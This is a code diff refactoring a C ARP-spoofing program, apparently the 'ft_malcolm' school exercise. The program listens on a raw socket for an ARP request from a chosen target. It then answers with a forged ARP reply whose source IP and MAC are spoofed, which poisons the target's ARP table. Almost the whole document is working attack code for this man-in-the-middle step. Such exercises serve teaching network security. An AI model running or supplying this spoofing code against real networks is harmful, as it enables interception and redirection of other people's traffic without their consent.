@@ -7,6 +7,7 @@
 #define ERR -1
 #define BAD 1
 #define GOOD 0
+#define ARP_PKT 42
 
 int
 crt_sock(t_malcolm *m) {
@@ -21,15 +22,15 @@ crt_sock(t_malcolm *m) {
 
 void
 wfor_arp(t_malcolm *m) {
-	unsigned char buf[42];
+	uint8_t pkt[ARP_PKT];
 	struct sockaddr_ll from;
-	memset(&from, 0, sizeof(from));
+	zro_mem(&from, sizeof(from));
 	socklen_t lenfrom = sizeof(from);
-	ssize_t r = recvfrom(m->fd, buf, sizeof(buf), 0, (struct sockaddr*)&from, &lenfrom);
+	ssize_t r = recvfrom(m->fd, pkt, sizeof(pkt), 0, (struct sockaddr*)&from, &lenfrom);
 	if (r < 0)
 		return;
-	t_ether_hdr *eth = (t_ether_hdr *)buf;
-	t_arp_hdr *arp = (t_arp_hdr*)(buf + sizeof(t_ether_hdr));
+	t_ether_hdr *eth = (t_ether_hdr *)pkt;
+	t_arp_hdr *arp = (t_arp_hdr*)(pkt + sizeof(t_ether_hdr));
 	if (ntohs(arp->op) == ARPOP_REQUEST && ntohs(eth->type) == ETH_P_ARP) {
 		if (cmp_mem(arp->spa, &m->trg_ip, IPV4_L) != 0)
 			return;
@@ -44,51 +45,55 @@ wfor_arp(t_malcolm *m) {
 				arp->sha[3], arp->sha[4], arp->sha[5],
 				arp->spa[0], arp->spa[1], arp->spa[2],
 				arp->spa[3]);
+		printf("Now sending an ARP reply to the target address with spoofed source, please wait..\n");
 		sleep(1);
 		sto_arp(m, arp);
-		f_exit(0, free_malcolm, m, "pkt sent");	
+		f_exit(0, free_malcolm, m, "Sent an ARP reply packet, you may now check the arp table on the target.\nExiting program...");	
 	}
 	return;
 }
 
-void sto_arp(t_malcolm *m, t_arp_hdr *old_arp) {
-	
-	unsigned char new_buf[42];
-	t_ether_hdr *eth = (t_ether_hdr *)new_buf;
+static void
+build_pkt(t_malcolm *m, t_arp_hdr *req_pkt, uint8_t *rep_pkt) {
+	t_ether_hdr *eth = (t_ether_hdr *)rep_pkt;
 	cpy_mem(eth->dmac, m->trg_mac, MAC_L);
 	cpy_mem(eth->smac, m->src_mac, MAC_L);
 	eth->type = htons(ETH_P_ARP);
 
-	t_arp_hdr *arp = (t_arp_hdr*)(new_buf + sizeof(t_ether_hdr));
+	t_arp_hdr *arp = (t_arp_hdr*)(rep_pkt + sizeof(t_ether_hdr));
 	cpy_mem(arp->sha, m->src_mac, MAC_L);
 	cpy_mem(arp->spa, m->src_ip, IPV4_L);
-	cpy_mem(arp->tha, old_arp->sha, MAC_L);
-	cpy_mem(arp->tpa, old_arp->spa, IPV4_L);
+	cpy_mem(arp->tha, req_pkt->sha, MAC_L);
+	cpy_mem(arp->tpa, req_pkt->spa, IPV4_L);
 	arp->op = htons(ARPOP_REPLY);
 	arp->pln = IPV4_L;
 	arp->hln = MAC_L;
 	arp->pro = htons(0x0800);
 	arp->hrd = htons(1);
+}
 
-	struct sockaddr_ll from;
-	memset(&from, 0, sizeof(from));
-	from.sll_family = AF_PACKET;
-	from.sll_ifindex = if_nametoindex(m->itrf);
-	if (from.sll_ifindex == 0)
+static void
+build_dst(t_malcolm* m, struct sockaddr_ll* dst, socklen_t* dstlen) {
+	memset(dst, 0, sizeof(*dst));
+	dst->sll_family = AF_PACKET;
+	dst->sll_ifindex = if_nametoindex(m->itrf);
+	if (dst->sll_ifindex == 0)
 		f_exit(1, free_malcolm, m, strerror(errno));
-	from.sll_halen = MAC_L;
-	cpy_mem(from.sll_addr, eth->dmac, MAC_L); 
-	socklen_t lenfrom = sizeof(from);
-	printf("SENDING: dmac=%02x:%02x:%02x:%02x:%02x:%02x op=%d spa=%d.%d.%d.%d tpa=%d.%d.%d.%d ifindex=%d len=%zu\n",
-		eth->dmac[0], eth->dmac[1], eth->dmac[2], eth->dmac[3], eth->dmac[4], eth->dmac[5],
-		ntohs(arp->op),
-		arp->spa[0], arp->spa[1], arp->spa[2], arp->spa[3],
-		arp->tpa[0], arp->tpa[1], arp->tpa[2], arp->tpa[3],
-		from.sll_ifindex, sizeof(new_buf));
+	dst->sll_halen = MAC_L;
+	cpy_mem(dst->sll_addr, m->trg_mac, MAC_L); 
+	(*dstlen) = sizeof(*dst);
+}
 
-	ssize_t r = sendto(m->fd, new_buf, sizeof(new_buf), 0, (struct sockaddr*)&from, lenfrom);
-	printf("sendto ret=%zd errno=%s\n", r, strerror(errno));
+void sto_arp(t_malcolm *m, t_arp_hdr *old_arp) {
+	uint8_t rep_pkt[ARP_PKT];
+	struct sockaddr_ll dst;
+	socklen_t dstlen;
+
+	build_pkt(m, old_arp, rep_pkt);
+	build_dst(m, &dst, &dstlen);
+
+	ssize_t r = sendto(m->fd, rep_pkt, sizeof(rep_pkt), 0, (struct sockaddr*)&dst, dstlen);
 	if (r < 0)
-		f_exit(1, free_malcolm, m, strerror(errno));	
-	f_exit(0, free_malcolm, m, "pkt sent");	
+		f_exit(1, free_malcolm, m, strerror(errno));
+	return;
 }
